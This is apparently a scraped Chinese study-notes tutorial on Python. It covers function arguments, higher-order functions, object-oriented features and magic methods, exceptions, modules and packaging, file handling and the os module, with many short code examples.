如果函数定义中已经有了一个可变参数，后面跟着的命名关键字参数就不再需要一个特殊分隔符 * 了：12def person(name, age, *args, city, job): print(name, age, args, city, job) 命名关键字参数必须传入参数名，这和位置参数不同。如果没有传入参数名，调用将报错：1234&gt;&gt;&gt; person('Jack', 24, 'Beijing', 'Engineer')Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;TypeError: person() takes 2 positional arguments but 4 were given 由于调用时缺少参数名city和job，Python解释器把这4个参数均视为位置参数，但person()函数仅接受2个位置参数。 命名关键字参数可以有缺省值，从而简化调用：12def person(name, age, *, city='Beijing', job): print(name, age, city, job) 由于命名关键字参数city具有默认值，调用时，可不传入city参数：12&gt;&gt;&gt; person('Jack', 24, job='Engineer')Jack 24 Beijing Engineer map()/reduce() 高阶函数map()函数接收两个参数，一个是函数，一个是Iterable，map将传入的函数依次作用到序列的每个元素，并把结果作为新的Iterator返回。123456&gt;&gt;&gt; def f(x):... return x * x...&gt;&gt;&gt; r = map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])&gt;&gt;&gt; list(r)[1, 4, 9, 16, 25, 36, 49, 64, 81] map()传入的第一个参数是f，即函数对象本身。由于结果r是一个Iterator，Iterator是惰性序列，因此通过list()函数让它把整个序列都计算出来并返回一个list。 reduce把一个函数作用在一个序列 [x1, x2, x3, ...] 上，这个函数必须接收两个参数，reduce把结果继续和序列的下一个元素做累积计算，其效果就是：1reduce(f, [x1, x2, x3, x4]) = f(f(f(x1, x2), x3), x4) 比方说对一个序列求和，就可以用reduce实现：123456&gt;&gt;&gt; from functools import reduce&gt;&gt;&gt; def add(x, y):... return x + y...&gt;&gt;&gt; reduce(add, [1, 3, 5, 7, 9])25 整理成一个str2int的函数就是：12345678910from functools import reduceDIGITS = &#123;'0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7, '8': 8, '9': 9&#125;def str2int(s): def fn(x, y): return x * 10 + y def char2num(s): return DIGITS[s] return reduce(fn, map(char2num, s)) filter() 高阶函数实现过滤filter()也接收一个函数和一个序列。和map()不同的是，filter()把传入的函数依次作用于每个元素，然后根据返回值是True还是False决定保留还是丢弃该元素。 例如，在一个list中，删掉偶数，只保留奇数，可以这么写：12345def is_odd(n): return n % 2 == 1list(filter(is_odd, [1, 2, 4, 5, 6, 9, 10, 15]))# 结果: [1, 5, 9, 15] sorted() 高阶函数实现排序根据函数的返回值对原数据进行排序1234L = [(&apos;Bob&apos;, 75), (&apos;Adam&apos;, 92), (&apos;Bart&apos;, 66), (&apos;Lisa&apos;, 88)]def by_score(t): return t[1]L2 = sorted(L, key = by_score) # [(&apos;Bart&apos;, 66), (&apos;Bob&apos;, 75), (&apos;Lisa&apos;, 88), (&apos;Adam&apos;, 92)] 要进行反向排序，不必改动key函数，可以传入第三个参数 reverse=True 匿名函数 lambda表达式匿名函数 lambda x: x * x 实际上就是：12def f(x): return x * x 面向对象定义类1234567class 类名(object): def 方法1(self, 参数列表): pass def 方法2(self, 参数列表): pass 方法相对于函数只是多了一个 self 参数你一定会在想 Python 是如何给 self 赋值的，以及为什么你不必给它一个值。一个例子或许 会让这些疑问得到解答。假设你有一个 MyClass 的类，这个类下有一个实例 myobject 。当 你调用一个这个对象的方法，如 myobject.method(arg1, arg2) 时，Python 将会自动将其转 换成 MyClass.method(myobject, arg1, arg2) ——这就是 self 的全部特殊之处所在。 self，表示创建的实例本身 创建对象1对象变量 = 类名() 内置方法 序号 方法名 类型 作用 01 __new__ 方法 创建对象时，会被 自动 调用 02 __init__ 方法 对象被初始化时，会被 自动 调用 03 __del__ 方法 对象被从内存中销毁前，会被 自动 调用 04 __str__ 方法 返回对象的描述信息，print 函数输出使用 可以使用 dir(obj) 查看 __new__ 方法使用 类名() 创建对象时，Python 的解释器 首先 会 调用 __new__ 方法为对象 分配空间__new__ 是一个 由 object 基类提供的 内置的静态方法，主要作用有两个：1) 在内存中为对象 分配空间2) 返回 对象的引用Python 的解释器获得对象的 引用 后，将引用作为 第一个参数，传递给 __init__ 方法 重写 __new__ 方法 一定要 return super().__new__(cls)否则 Python 的解释器 得不到 分配了空间的 对象引用，就不会调用对象的初始化方法 注意：__new__ 是一个静态方法 类方法，在调用时需要 主动传递 cls 参数 123456789101112class MusicPlayer(object): def __new__(cls, *args, **kwargs): # 如果不返回则无法往后执行 __init__ return super().__new__(cls) def __init__(self): print("初始化音乐播放对象")player = MusicPlayer()print(player) 初始化 __init__初始化方法 __init__ 主要做的事就是接受创建对象时传递的参数，创建属性，属性的初始化赋值1234567class Women: def __init__(self, name): self.name = name self.__age = 18xiaofang = Women("小芳") 实例属性 在类的内部创建 12345678class Women: def __init__(self, name): # 这就创建属性了 self.name = name # 创建私有属性 self.__age = 18xiaofang = Women("小芳") 通过对象创建 1xiaofang.sex = 0 这就创建了属性，坑不坑，不建议这样使用 限制创建实例属性 __slots__Python允许在定义class的时候，定义一个特殊的 __slots__ 变量，来限制该class实例能添加的属性：12class Student(object): __slots__ = ('name', 'age') # 用tuple定义允许绑定的属性名称 使用 __slots__ 要注意， __slots__ 定义的属性仅对当前类实例起作用，对继承的子类是不起作用的：除非在子类中也定义 __slots__ ，这样，子类实例允许定义的属性就是自身的 __slots__ 加上父类的 __slots__ 。 私有在创建私有属性和私有方法的时候只需要在属性名或方法名前加两个下划线 __123456789101112131415161718class Women: def __init__(self, name): self.name = name # 不要问女生的年龄 self.__age = 18 def __secret(self): print("我的年龄是 %d" % self.__age)xiaofang = Women("小芳")# 私有属性，外部不能直接访问# print(xiaofang.__age)# 私有方法，外部不能直接调用# xiaofang.__secret() Python 中，并没有 真正意义 的 私有 在给 属性、方法 命名时，实际是对 名称 做了一些特殊处理，使得外界无法访问到处理方式：在 名称 前面加上 _类名 =&gt; _类名__名称12345# 私有属性，外部不能直接访问到print(xiaofang._Women__age)# 私有方法，外部不能直接调用xiaofang._Women__secret() _x: 单前置下划线,私有化属性或方法，from somemodule import * 禁止导入,类对象和子类可以访问__xx：双前置下划线,避免与子类中的属性命名冲突，无法在外部直接访问(名字重整所以访问不到)，子类不继承，子类不能访问 继承python 默认继承 Object 类123class 类名(父类名): pass 调用父类的属性/方法如果子类对父类的方法进行了重写覆盖，但是想调用父类中的方法可以通过 super().父类方法名关于 super 在 Python 中 super 是一个 特殊的类 super() 就是使用 super 类创建出来的对象 调用父类方法的另外一种方式（知道） 在 Python 2.x 时，如果需要调用父类的方法，还可以使用以下方式：1父类名.方法(self) 多继承12class 子类名(父类名1, 父类名2...) pass 不推荐，因为多个父类中重复的变量的方法将会变得不可控 Python 中的 MRO —— 方法搜索顺序（知道）Python 中针对 类 提供了一个 内置属性 __mro__ 可以查看 方法 搜索顺序MRO 是 method resolution order，主要用于 在多继承时判断 方法、属性 的调用 路径假设 C 类继承自 A 类和 B 类1234print(C.__mro__)输出结果(&lt;class &apos;__main__.C&apos;&gt;, &lt;class &apos;__main__.A&apos;&gt;, &lt;class &apos;__main__.B&apos;&gt;, &lt;class &apos;object&apos;&gt;) MixInMixIn的目的就是给一个类增加多个功能，这样，在设计类的时候，我们优先考虑通过多重继承来组合多个MixIn的功能，而不是设计多层次的复杂的继承关系。 假设1234567class Dog(Mammal, Runnable, Carnivorous): pass``` 由于多个父类中有相同的方法，会导致某个方法不可控，改成MixIn的方式就是让Dog继承一个主线Mammal,而其他两个父类中要用到的最小部分单独摘出来作为一个类，这个类通常以MixIn结尾 ```pythonclass Dog(Mammal, RunnableMixIn, CarnivorousMixIn): pass 类对象在 Python 中，类 是一个特殊的对象 —— 类对象除了封装 实例 的 属性 和 方法外，类对象 还可以拥有自己的 属性 和 方法 所有的实例共享 类属性和类方法，通过类名进行访问 类属性12345678910111213141516171819class Tool(object): # 定义类属性 # 使用赋值语句，定义类属性，记录创建工具对象的总数 count = 0 def __init__(self, name): self.name = name # 针对类属性做一个计数+1 Tool.count += 1# 创建工具对象tool1 = Tool("斧头")tool2 = Tool("榔头")tool3 = Tool("铁锹")# 知道使用 Tool 类到底创建了多少个对象?print("现在创建了 %d 个工具" % Tool.count) 在 Python 中 属性的获取 存在一个 向上查找机制，在对象中查找不到的实例属性会自动向上查找类属性因此，要访问类属性有两种方式： 类名.类属性 对象.类属性 （不推荐） 如果使用 对象.类属性 = 值 赋值语句，只会 给对象添加一个属性，而不会影响到 类属性的值 类方法123@classmethoddef 类方法名(cls): pass 类方法需要用 修饰器 @classmethod 来标识，告诉解释器这是一个类方法 类方法的 第一个参数 应该是 cls 2.1 由 哪一个类 调用的方法，方法内的 cls 就是 哪一个类的引用 2.2 这个参数和 实例方法 的第一个参数是 self 类似 通过 类名. 调用 类方法，调用方法时，不需要传递 cls 参数 在方法内部 4.1 可以通过 cls. 访问类的属性 4.2 也可以通过 cls. 调用其他的类方法 静态方法123@staticmethoddef 静态方法名(): pass 静态方法也是用过 类名. 调用和类方法的不同是：没有办法通过 cls来访问 类属性 或者调用 类方法，但是可以通过类名直接调用但是，这会在继承的时候显示出来差别，因为类方法的 cls 参数是动态的，使用的是调用者的类对象，而静态方法是写死的 实例方法、静态方法和类方法三种方法在内存中 都归属于类，区别在于调用方式不同。 实例方法：由对象调用；至少一个self参数；执行实例方法时，自动将调用该方法的对象赋值给self；类方法：由类调用； 至少一个cls参数；执行类方法时，自动将调用该方法的类赋值给cls；静态方法：由类调用；无默认参数； 相同点：对于所有的方法而言，均属于类，所以 在内存中也只保存一份不同点：方法调用者不同、调用方法时自动传入的参数不同。 单例12345678910111213141516171819202122232425262728293031class MusicPlayer(object): # 记录第一个被创建对象的引用 instance = None # 记录是否执行过初始化动作 init_flag = False def __new__(cls, *args, **kwargs): # 1. 判断类属性是否是空对象 if cls.instance is None: # 2. 调用父类的方法，为第一个对象分配空间 cls.instance = super().__new__(cls) # 3. 返回类属性保存的对象引用 return cls.instance def __init__(self): # 防止每次都初始化 if not MusicPlayer.init_flag: print("初始化音乐播放器") MusicPlayer.init_flag = True# 创建多个对象player1 = MusicPlayer()print(player1)player2 = MusicPlayer()print(player2) 注意点创建对象的时候每次都会执行 __new__ 和 __init__ 方法，所以 __init__ 方法中的初始化也要进行判断 is 与 == 区别：is 用于判断 两个变量 引用对象(地址)是否为同一个== 用于判断 引用变量的值 是否相等123456&gt;&gt;&gt; a = [1, 2, 3]&gt;&gt;&gt; b = [1, 2, 3]&gt;&gt;&gt; b is aFalse&gt;&gt;&gt; b == aTrue 属性操作 getattr()、setattr()、hasattr() 反射获取1234567&gt;&gt;&gt; class MyObject(object):... def __init__(self):... self.x = 9... def power(self):... return self.x * self.x...&gt;&gt;&gt; obj = MyObject() 紧接着，可以测试该对象的属性：12345678910111213&gt;&gt;&gt; hasattr(obj, 'x') # 有属性'x'吗？True&gt;&gt;&gt; obj.x9&gt;&gt;&gt; hasattr(obj, 'y') # 有属性'y'吗？False&gt;&gt;&gt; setattr(obj, 'y', 19) # 设置一个属性'y'&gt;&gt;&gt; hasattr(obj, 'y') # 有属性'y'吗？True&gt;&gt;&gt; getattr(obj, 'y') # 获取属性'y'19&gt;&gt;&gt; obj.y # 获取属性'y'19 如果试图获取不存在的属性，会抛出AttributeError的错误：1234&gt;&gt;&gt; getattr(obj, 'z') # 获取属性'z'Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;AttributeError: 'MyObject' object has no attribute 'z' 可以传入一个default参数，如果属性不存在，就返回默认值：12&gt;&gt;&gt; getattr(obj, 'z', 404) # 获取属性'z'，如果不存在，返回默认值404404 要注意的是，只有在不知道对象信息的时候，我们才会去获取对象信息。(性能原因) 使用装饰器 decorator可以将方法当做属性来使用，也就是类似于定义 getter/setter 方法1234567891011121314151617181920212223class Student(object): @property # 设置成getter属性 def score(self): return self._score @score.setter # 设置成setter属性 def score(self, value): if not isinstance(value, int): raise ValueError('score must be an integer!') if value &lt; 0 or value &gt; 100: raise ValueError('score must between 0 ~ 100!') self._score = value&gt;&gt;&gt; s = Student()&gt;&gt;&gt; s.score = 60 # OK，实际转化为s.set_score(60)&gt;&gt;&gt; s.score # OK，实际转化为s.get_score()60&gt;&gt;&gt; s.score = 9999Traceback (most recent call last): ...ValueError: score must between 0 ~ 100! 三种@property装饰器1234567891011121314151617181920212223#coding=utf-8# ############### 定义 ###############class Goods: """python3中默认继承object类 以python2、3执行此程序的结果不同，因为只有在python3中才有@xxx.setter @xxx.deleter """ @property def price(self): print('@property') @price.setter def price(self, value): print('@price.setter') @price.deleter def price(self): print('@price.deleter')# ############### 调用 ###############obj = Goods()obj.price # 自动执行 @property 修饰的 price 方法，并获取方法的返回值obj.price = 123 # 自动执行 @price.setter 修饰的 price 方法，并将 123 赋值给方法的参数del obj.price # 自动执行 @price.deleter 修饰的 price 方法 类属性方式，创建值为property对象的类属性property方法中有个四个参数 第一个参数是方法名，调用 对象.属性 时自动触发执行方法第二个参数是方法名，调用 对象.属性 ＝ XXX 时自动触发执行方法第三个参数是方法名，调用 del 对象.属性 时自动触发执行方法第四个参数是字符串，调用 对象.属性.__doc__ ，此参数是该属性的描述信息123456789101112131415161718192021222324#coding=utf-8class Foo(object): def get_bar(self): print("getter...") return 'laowang' def set_bar(self, value): """必须两个参数""" print("setter...") return 'set value' + value def del_bar(self): print("deleter...") return 'laowang' BAR = property(get_bar, set_bar, del_bar, "description...")obj = Foo()obj.BAR # 自动调用第一个参数中定义的方法：get_barobj.BAR = "alex" # 自动调用第二个参数中定义的方法：set_bar方法，并将“alex”当作参数传入desc = Foo.BAR.__doc__ # 自动获取第四个参数中设置的值：description...print(desc)del obj.BAR # 自动调用第三个参数中定义的方法：del_bar方法 魔术属性参考-定制类 __doc__ 获取类的描述信息1234567class Foo: """ 描述类信息，这是用于看片的神奇 """ def func(self): passprint(Foo.__doc__)#输出：类的描述信息 __module__ 模块信息 __class__类信息test.py12345678910111213# -*- coding:utf-8 -*-class Person(object): def __init__(self): self.name = 'laowang'``` main.py```pythonfrom test import Personobj = Person()print(obj.__module__) # 输出 test 即：输出模块print(obj.__class__) # 输出 test.Person 即：输出类 __init__ 创建的时候触发初始化方法，通过类创建对象时，自动触发执行1234567class Person: def __init__(self, name): self.name = name self.age = 18obj = Person('laowang') # 自动执行类中的 __init__ 方法 __del__ 删除对象的时候触发当对象在内存中被释放时，自动触发执行。注：此方法一般无须定义，因为Python是一门高级语言，程序员在使用时无需关心内存的分配和释放，因为此工作都是交给Python解释器来执行，所以，__del__ 的调用是由解释器在进行垃圾回收时自动触发执行的。123class Foo: def __del__(self): pass __call__ 对象后面加括号，触发执行。对象后面加括号，触发执行。注：__init__ 方法的执行是由创建对象触发的，即：对象 = 类名() ；而对于 __call__ 方法的执行是由对象后加括号触发的，即：对象() 或者 类()()12345678910class Foo: def __init__(self): pass def __call__(self, *args, **kwargs): print('__call__')obj = Foo() # 执行 __init__obj() # 执行 __call__ __dict__ 类或对象中的所有属性和方法类或对象中的所有属性类的实例属性属于对象；类中的类属性和方法等属于类，即： 12345678910111213141516171819202122class Province(object): country = 'China' def __init__(self, name, count): self.name = name self.count = count def func(self, *args, **kwargs): print('func')# 获取类的属性，即：类属性、方法、print(Province.__dict__)# 输出：&#123;'__dict__': &lt;attribute '__dict__' of 'Province' objects&gt;, '__module__': '__main__', 'country': 'China', '__doc__': None, '__weakref__': &lt;attribute '__weakref__' of 'Province' objects&gt;, 'func': &lt;function Province.func at 0x101897950&gt;, '__init__': &lt;function Province.__init__ at 0x1018978c8&gt;&#125;obj1 = Province('山东', 10000)print(obj1.__dict__)# 获取 对象obj1 的属性# 输出：&#123;'count': 10000, 'name': '山东'&#125;obj2 = Province('山西', 20000)print(obj2.__dict__)# 获取 对象obj1 的属性# 输出：&#123;'count': 20000, 'name': '山西'&#125; __str__ 类当字符串使用的时候如果一个类中定义了 __str__ 方法，那么在打印 对象 时，默认输出该方法的返回值。12345678class Foo: def __str__(self): return 'laowang'obj = Foo()print(obj)# 输出：laowang __getitem__、__setitem__、__delitem__ 当字典使用用于索引操作，如字典。以上分别表示获取、设置、删除数据12345678910111213141516171819# -*- coding:utf-8 -*-class Foo(object): def __getitem__(self, key): print('__getitem__', key) def __setitem__(self, key, value): print('__setitem__', key, value) def __delitem__(self, key): print('__delitem__', key)obj = Foo()result = obj['k1'] # 自动触发执行 __getitem__obj['k2'] = 'laowang' # 自动触发执行 __setitem__del obj['k1'] # 自动触发执行 __delitem__ __getslice__、__setslice__、__delslice__ 对象切片该三个方法用于分片操作，如：列表123456789101112131415161718# -*- coding:utf-8 -*-class Foo(object): def __getslice__(self, i, j): print('__getslice__', i, j) def __setslice__(self, i, j, sequence): print('__setslice__', i, j) def __delslice__(self, i, j): print('__delslice__', i, j)obj = Foo()obj[-1:1] # 自动触发执行 __getslice__obj[0:1] = [11,22,33,44] # 自动触发执行 __setslice__del obj[0:2] # 自动触发执行 __delslice__ __iter__ 和 __next__ 实现迭代器，用来遍历如果一个类想被用于for … in循环，类似list或tuple那样，就必须实现一个 __iter__() 方法，该方法返回一个迭代对象，然后，Python的for循环就会不断调用该迭代对象的 __next__() 方法拿到循环的下一个值，直到遇到StopIteration错误时退出循环。 我们以斐波那契数列为例，写一个Fib类，可以作用于for循环：12345678910111213141516171819202122232425class Fib(object): def __init__(self): self.a, self.b = 0, 1 # 初始化两个计数器a，b def __iter__(self): return self # 实例本身就是迭代对象，故返回自己 def __next__(self): self.a, self.b = self.b, self.a + self.b # 计算下一个值 if self.a &gt; 100000: # 退出循环的条件 raise StopIteration() return self.a # 返回下一个值现在，试试把Fib实例作用于for循环：&gt;&gt;&gt; for n in Fib():... print(n)...11235...4636875025 __getattr__ __setattr__ 属性不存在的时候调用当属性不存在的时候就会调用 __getattr__12345678910class Student(object): def __init__(self): self.name = 'Michael' def __getattr__(self, attr): if attr=='score': return 99 def __setattr__(self, key, value): self[key] = value 当调用不存在的属性时，比如score，Python解释器会试图调用 __getattr__(self, &#39;score&#39;) 来尝试获得属性，这样，我们就有机会返回score的值：12345&gt;&gt;&gt; s = Student()&gt;&gt;&gt; s.name'Michael'&gt;&gt;&gt; s.score99 返回函数也是完全可以的：12345class Student(object): def __getattr__(self, attr): if attr=='age': return lambda: 25 只是调用方式要变为：12345&gt;&gt;&gt; s = Student()&gt;&gt;&gt; s.age&lt;function Student.__getattr__.&lt;locals&gt;.&lt;lambda&gt; at 0x0000000001E7BB70&gt;&gt;&gt;&gt; s.age()25 此外，注意到任意调用如s.abc都会返回None，这是因为我们定义的 __getattr__ 默认返回就是None。要让class只响应特定的几个属性，我们就要按照约定，抛出AttributeError的错误：123456class Student(object): def __getattr__(self, attr): if attr=='age': return lambda: 25 raise AttributeError('\'Student\' object has no attribute \'%s\'' % attr) 异常看例子123456789101112131415161718192021try: # 尝试执行的代码 passexcept 错误类型1: # 针对错误类型1，对应的代码处理 passexcept 错误类型2: # 针对错误类型2，对应的代码处理 passexcept (错误类型3, 错误类型4): # 针对错误类型3 和 4，对应的代码处理 passexcept Exception as result: # 打印错误信息 print(result)else: # 没有异常才会执行的代码 passfinally: # 无论是否有异常，都会执行的代码 print("无论是否有异常，都会执行的代码") 抛出异常 raise12345678910111213141516171819def input_password(): pwd = input("请输入密码：") if len(pwd) &gt;= 8: return pwd # 1&gt; 创建异常对象 - 使用异常的错误信息字符串作为参数 ex = Exception("密码长度不够") # 2&gt; 抛出异常对象 raise extry: user_pwd = input_password() print(user_pwd)except Exception as result: print("发现错误：%s" % result) 记录异常日志ython内置的logging模块可以非常容易地记录错误信息：123456789101112131415161718# err_logging.pyimport loggingdef foo(s): return 10 / int(s)def bar(s): return foo(s) * 2def main(): try: bar('0') except Exception as e: logging.exception(e)main()print('END') 同样是出错，但程序打印完错误信息后会继续执行，并正常退出：1234567891011$ python3 err_logging.pyERROR:root:division by zeroTraceback (most recent call last): File "err_logging.py", line 13, in main bar('0') File "err_logging.py", line 9, in bar return foo(s) * 2 File "err_logging.py", line 6, in foo return 10 / int(s)ZeroDivisionError: division by zeroEND 通过配置，logging还可以把错误记录到日志文件里，方便事后排查。 模块和包模块和js一样一个文件就是一个模块在模块中定义的 全局变量 、函数、类 都是提供给外界直接使用的 工具模块 就好比是 工具包，要想使用这个工具包中的工具，就需要先 导入 这个模块 引入模块 import module 导入整个模块 module，通过模块来访问模块中的变量 12345import sysprint('The command line arguments are:')for i in sys.argv: print(i)print('\n\nThe PYTHONPATH is', sys.path, '\n') 如果模块的名字太长，可以使用 as 指定模块的名称，以方便在代码中的使用1import 模块名1 as 模块别名 from module import var 从模块 module 中导入变量 var ，导入到的变量可以直接使用,也可以导入私有变量，不推荐导入一个模块的多个变量 from module import var1, var2导入一个模块的所有变量，除了私有变量 from module import * 一旦发现冲突，可以使用 as 关键字 给其中一个工具起一个别名 __name__ 属性前置理解：当模块第一次被导入时，它所包含的没有缩进的代码将被执行所以可以通过判断 __name__ 来确定该模块是否是独立运行 每个模块都有定义它的 __name__ 属性，当 __name__ == &#39;__main__&#39;表示这个模块是独立运行的，而不是导入到了其他模块。 __file__ 属性 模块路径Python 中每一个模块都有一个内置属性 __file__ 可以 查看模块 的 完整路径 import搜索路径查看 import 搜索的路径12import syssys.path 从上面列出的目录里依次查找要导入的模块文件 &#39;&#39; 表示当前路径 列表中的路径的先后顺序代表了python解释器在搜索模块时的先后顺序 添加新的模块路径12sys.path.append('/home/itcast/xxx')sys.path.insert(0, '/home/itcast/xxx') # 可以确保先搜索这个路径 重新导入模块导入模块后，如果没有结束，然后修改了模块的内容，在此导入，依旧不会生效，这就要用到重新导入模块12from imp import reloadreload(module) # 重新导入模块 多模块开发时导入时需要注意当两个模块共用了一个模块，并且同时执行时会出现问题假设 test.py 模块123ding = 'ding'def test(): print('--2--') 假设 xiaoming.py 模块123456import testdef xChang(): test.ding = 'ran'def xEcho(): print(test.ding) 假设 you.py 模块123456import testdef chang(): test.ding = 'bunao'def echo(): print(test.ding) 假设 main.py 模块1234from xiaoming import *from you import *chang()xEcho() # 出现了bunao 直接通过 import 导入模块使用时，可以将这个模块比作 一个类对象 使用，在一个模块中使用会影响到其他使用的模块1234567import common# 如果通过这种方式导入的变量，更改变量 common.HANDLE_FLAG则会影响其他导入这个模块的这个值 ``` 通过 `from xxx import xxx` 导入的，相当于直接将变量复制到本模块，不会影响其他的模块 ```pythonfrom common import HANDLE_FLAG# 如果是通过这种方式导入的变量，更改变量HANDLE_FLAG则不会影响到其他使用该模块中的这个变量 包文件多了就要用文件夹管理，python中和java一样将文件夹称为包 包是指一个包含模块与一个特殊的 __init__.py 文件的文件夹，后者向 Python 表明这一文件夹是特别的，因为其包含了 Python 模块。 建设你想创建一个名为“world”的包，其中还包含着”asia“、”africa“等其它子包，同时这些子包都包含了诸如”india“、”madagascar“等模块。下面是你会构建出的文件夹的结构：12345678910111213- &lt;some folder present in the sys.path&gt;/ - world/ - __init__.py - asia/ - __init__.py - india/ - __init__.py - foo.py - africa/ - __init__.py - madagascar/ - __init__.py - bar.py 使用 import 包名 可以一次性导入 包 中 所有的模块 pip安装第三方模块pip 是一个现代的，通用的 Python 包管理工具提供了对 Python 包的查找、下载、安装、卸载等功能123# 将模块安装到 Python 3.x 环境$ sudo pip3 install pygame$ sudo pip3 uninstall pygame 发布模块假设要在发布的包在test文件夹下buildpacket包下的模块目录如下12345678/test setup.py # 创建 setup.py 文件 /buildpacket __init__.py ding.py /ran __init__.py bunao.py 创建setup.py文件，setup.py 文件内容如下 1234567891011from distutils.core import setupsetup(name="ding", # 包名,生成发布压缩包时的压缩包名 version="1.0", # 版本 description="描述", # 描述信息 long_description="完整描述", # 完整描述信息 author="ding", # 作者 author_email="", # 作者邮箱 url="www.bunao.me", # 主页 py_modules=["buildpacket.ding", "buildpacket.ran.bunao"]) # 要打包的模块 官网上有关字典参数的详细信息 构建模块 1$ python3 setup.py build 这个步骤其实就是复制，将包复制到 ./build/lib/ 下 生成发布压缩包1$ python3 setup.py sdist 在 ./dist/ 下生成要发布的压缩包 安装模块 1234# 解压./dist/ 下的压缩包 $ tar -zxvf ding-1.0.tar.gz# 进入到解压后的文件夹中 执行里面的setup.py$ sudo python3 setup.py install win系统将会在安装python的目录中的 Lib/site-packages/ 下创建buildpacket包(带__pycache__文件夹)同时也会在执行 install 的目录下创建build/buildpacket 包(原包，不带__pycache__文件夹) 引入模块 123import buildpacket # 引入整个包import buildpacket.ding # 引入包下的模块import buildpacket.ran.bunao # 引入包下的包下的模块 删除模块找到安装模块的地方，直接删除包文件夹 12$ cd /usr/local/lib/python3.5/dist-packages/$ sudo rm -r ding* 文件操作 序号 函数/方法 说明 01 open 打开文件，并且返回文件操作对象 02 read 将文件所有内容读取到内存,可以反复调用read(size)方法，每次最多读取size个字节的内容。 03 readline 将文件一行内容读取到内存 03 readlines 将文件所有行内容读取到list数组中 04 write 将指定内容写入文件 05 close 关闭文件 123456789# 1. 打开 - 文件名需要注意大小写file = open("README")# 2. 读取text = file.read()print(text)# 3. 关闭file.close() 打开文件方式open 函数默认以 只读方式 打开文件，并且返回文件对象语法如下：1f = open("文件名", "访问方式") 访问方式 说明 r 以只读方式打开文件。文件的指针将会放在文件的开头，这是默认模式。如果文件不存在，抛出异常 w 以只写方式打开文件。如果文件存在会被覆盖。如果文件不存在，创建新文件 a 以追加方式打开文件。如果该文件已存在，文件指针将会放在文件的结尾。如果文件不存在，创建新文件进行写入 r+ 以读写方式打开文件。文件的指针将会放在文件的开头。如果文件不存在，抛出异常 w+ 以读写方式打开文件。如果文件存在会被覆盖。如果文件不存在，创建新文件 a+ 以读写方式打开文件。如果该文件已存在，文件指针将会放在文件的结尾。如果文件不存在，创建新文件进行写入 大文件复制示例123456789101112131415161718# 1. 打开文件file_read = open("README")file_write = open("README[复件]", "w")# 2. 读取并写入文件while True: # 每次读取一行 text = file_read.readline() # 判断是否读取到内容 if not text: break file_write.write(text)# 3. 关闭文件file_read.close()file_write.close() 文件／目录操作在 Python 中，如果希望通过程序实现上述功能，需要导入 os 模块 文件操作 序号 方法名 说明 示例 01 rename 重命名文件 os.rename(源文件名, 目标文件名) 02 remove 删除文件 os.remove(文件名) 目录操作 序号 方法名 说明 示例 01 listdir 目录列表 os.listdir(目录名) 02 mkdir 创建目录 os.mkdir(目录名) 03 rmdir 删除目录 os.rmdir(目录名) 04 getcwd 获取当前目录 os.getcwd() 05 chdir 修改工作目录 os.chdir(目标目录) 06 path.isdir 判断是否是目录 os.path.isdir(目录路径) 基本模块默认情况下，Python解释器会搜索当前目录、所有已安装的内置模块和第三方模块，搜索路径存放在sys模块的path变量中：123&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.path['', '/Library/Frameworks/Python.framework/Versions/3.6/lib/python36.zip', '/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6', ..., '/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages'] 如果我们要添加自己的搜索目录，有两种方法： 一是直接修改 sys.path ，添加要搜索的目录：12&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.path.append('/Users/michael/my_py_scripts') 这种方法是在运行时修改，运行结束后失效。 第二种方法是设置环境变量 PYTHONPATH，该环境变量的内容会被自动添加到模块搜索路径中。设置方式与设置Path环境变量类似。注意只需要添加你自己的搜索路径，Python自己本身的搜索路径不受影响。 os模块 系统相关其实操作系统提供的命令只是简单地调用了操作系统提供的接口函数，Python内置的os模块也可以直接调用操作系统提供的接口函数。执行终端命令12345678910__import__('os').system('ls')等价代码import osos.system("终端命令")``` ```python&gt;&gt;&gt; import os&gt;&gt;&gt; os.name # 操作系统类型'posix' 如果是posix，说明系统是Linux、Unix或Mac OS X，如果是nt，就是Windows系统。 要获取详细的系统信息，可以调用uname()函数：12&gt;&gt;&gt; os.uname()posix.uname_result(sysname='Darwin', nodename='MichaelMacPro.local', release='14.3.0', version='Darwin Kernel Version 14.3.0: Mon Mar 23 11:59:05 PDT 2015; root:xnu-2782.20.48~5/RELEASE_X86_64', machine='x86_64') 注意uname()函数在Windows上不提供，也就是说，os模块的某些函数是跟操作系统相关的。 环境变量 在操作系统中定义的环境变量，全部保存在os.environ这个变量中，可以直接查看：12&gt;&gt;&gt; os.environenviron(&#123;'VERSIONER_PYTHON_PREFER_32_BIT': 'no', 'TERM_PROGRAM_VERSION': '326', 'LOGNAME': 'michael', 'USER': 'michael', 'PATH': '/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/opt/X11/bin:/usr/local/mysql/bin', ...&#125;) 要获取某个环境变量的值，可以调用os.environ.get(‘key’)：1234&gt;&gt;&gt; os.environ.get('PATH')'/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/opt/X11/bin:/usr/local/mysql/bin'&gt;&gt;&gt; os.environ.get('x', 'default')'default' 操作文件和目录操作文件和目录的函数一部分放在os模块中，一部分放在os.path模块中，这一点要注意一下。查看、创建和删除目录可以这么调用：12345678910# 查看当前目录的绝对路径:&gt;&gt;&gt; os.path.abspath('.')'/Users/michael'# 在某个目录下创建一个新目录，首先把新目录的完整路径表示出来:&gt;&gt;&gt; os.path.join('/Users/michael', 'testdir')'/Users/michael/testdir'# 然后创建一个目录:&gt;&gt;&gt; os.mkdir('/Users/michael/testdir')# 删掉一个目录:&gt;&gt;&gt; os.rmdir('/Users/michael/testdir') 把两个路径合成一个时，不要直接拼字符串，而要通过os.path.join()函数，这样可以正确处理不同操作系统的路径分隔符。在Linux/Unix/Mac下，os.path.join()返回这样的字符串：1part-1/part-2 而Windows下会返回这样的字符串：1part-1\part-2 同样的道理，要拆分路径时，也不要直接去拆字符串，而要通过os.path.split()函数，这样可以把一个路径拆分为两部分，后一部分总是最后级别的目录或文件名：12&gt;&gt;&gt; os.path.split('/Users/michael/testdir/file.txt')('/Users/michael/testdir', 'file.txt') 